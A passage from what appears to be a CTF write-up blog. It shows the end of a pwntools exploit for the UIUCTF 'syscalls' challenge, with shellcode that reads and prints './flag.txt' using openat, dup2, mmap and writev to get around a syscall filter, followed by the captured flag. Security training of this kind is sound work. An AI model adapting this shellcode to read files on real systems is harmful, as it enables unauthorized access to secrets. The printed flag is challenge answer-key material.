</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>DEBUG:
</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>attach(r)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;syscalls.chal.uiuc.tf&#34;</span>, <span style="color:#ae81ff">1337</span>, ssl<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> conn()
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	.global _start
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    _start:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    .intel_syntax noprefix
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    // openat
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    xor rdi, rdi              
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rsi, 0x07478
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push rsi
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rsi,  0x742e67616c662f2e
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push rsi
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rsi, rsp
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    xor rdx, rdx            
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rax, 257        
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rdi, -100       
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r10, -100              
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    syscall                    
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    // dup2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rdi, 1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rsi, 1001
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rax, 33
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    syscall
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    // mmap
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    xor rdi, rdi
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rsi, 64
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rdx, 1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r10, 2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r8, 3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    xor r9, r9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rax, 9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    syscall
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    // iov
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rbx, 64
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push rbx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rbx, rax
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push rbx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    // writev
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rdi, 1001
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rsi, rsp
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rdx, 1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rax, 0x14
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    syscall
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    // exit
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rax, 60                
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    xor rdi, rdi           
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    syscall
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>interactive()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><pre tabindex="0"><code>#uiuctf{a532aaf9aaed1fa5906de364a1162e0833c57a0246ab9ffc}
</code></pre>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2025 <a href="http://localhost:1313/">CTF Writeups</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
